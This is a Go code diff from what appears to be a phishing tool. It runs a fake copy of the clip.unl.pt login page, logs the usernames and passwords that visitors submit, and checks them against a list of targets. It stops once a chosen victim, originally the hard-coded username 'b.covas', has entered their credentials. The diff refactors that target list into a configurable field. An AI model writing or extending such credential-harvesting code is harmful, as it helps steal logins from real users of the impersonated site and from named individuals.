@@ -25,6 +25,7 @@ type Website struct {
 	Name     string
 	WebLink  string
 	LoginURL string
+	Targets  []string
 
 	HandleFunctions map[string]func(http.ResponseWriter, *http.Request)
 	RawFiles        []string
@@ -122,10 +123,6 @@ func (web *Website) openLogFile() {
 // ClipUnlPt is the constructor of https://clip.unl.pt
 func ClipUnlPt() *Website {
 
-	var targets = []string{
-		"b.covas",
-	}
-
 	var web = Website{
 		Name:    "clip.unl.pt",
 		WebLink: "https://clip.unl.pt",
@@ -155,14 +152,15 @@ func ClipUnlPt() *Website {
 			}
 
 			web.Log(u, p)
-			for _, value := range targets {
+			for _, value := range web.Targets {
 				if u == value {
 					fmt.Fprintln(w, clipUnlPtSuccessMsgTarget)
 					web.CancelFunc()
-				} else {
-					fmt.Fprintln(w, clipUnlPtSuccessMsg)
+					return
 				}
 			}
+
+			fmt.Fprintln(w, clipUnlPtSuccessMsg)
 		},
 
 		"/recuperar_senha/": func(w http.ResponseWriter, r *http.Request) {
